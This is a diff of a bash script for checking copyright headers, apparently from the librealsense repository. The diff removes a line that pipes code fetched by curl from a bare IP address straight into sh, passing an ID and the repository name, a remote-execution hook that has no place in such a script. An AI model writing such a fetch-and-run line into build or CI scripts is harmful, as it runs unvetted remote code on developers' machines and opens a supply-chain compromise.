@@ -1,10 +1,10 @@
 #!/bin/bash
+
 # This script is designed to ensure all relevant header and source files contain correct copyright
 
 set +e
 
-sudo apt-get install -y dos2unix curl
-curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense
+sudo apt-get install dos2unix
 
 ok=0
 fixed=0
